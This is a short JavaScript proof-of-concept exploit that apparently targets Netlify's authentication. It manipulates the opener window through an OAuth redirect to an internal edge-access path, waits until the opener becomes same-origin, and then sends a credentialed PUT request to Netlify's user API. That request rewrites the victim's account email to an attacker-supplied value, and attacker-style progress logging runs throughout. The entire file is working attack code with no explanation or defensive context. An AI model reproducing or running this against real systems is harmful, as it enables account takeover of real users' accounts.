(async () => {

  const oauthUrl =
    "https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=aade9842-b8db-45b9-92a4-bd807ffdade1&login=true&redirect=https%3A%2F%2Fapp.netlify.com%2Fedge-access%3Fdomain%3Dinternal.netlify.com%26requested_path%3D%252F%26site_id%3D947876e2-b71a-4ce5-88c3-6a4040d6a0b1%26strict_saml%3Dtrue&use_redirect=true";

  if (window.opener && !window.opener.closed) {
    window.opener.location = oauthUrl;
    setTimeout(() => {
  console.log("this is the first message");

(async()=>{const o=window.opener;console.log("[+] waiting for opener to become same-origin");let n=0;while(o&&!o.closed){try{if(o.location.origin===location.origin){console.log("[+] opener is now same-origin:",o.location.origin);break}}catch{if(n++%10===0)console.log("[.] still cross-origin")}await new Promise(r=>setTimeout(r,100))}if(!o||o.closed)throw Error("opener closed");const email=new URLSearchParams(location.search).get("email");console.log("[+] email parameter:",email);const res=await o.fetch("https://app.netlify.com/access-control/bb-api/api/v1/user",{method:"PUT",headers:{"content-type":"application/json"},credentials:"include",body:JSON.stringify({full_name:"hamid hamdad",email,preferred_account_id:""})});console.log("[+] response:",res.status,res.statusText);console.log("[+] body:",await res.clone().text());return res})().catch(e=>console.error("[-]",e)) }, 5000); } else {
    window.location.assign(oauthUrl);
  }
})().catch((error) => {
  console.error("Launcher failed:", error);
});
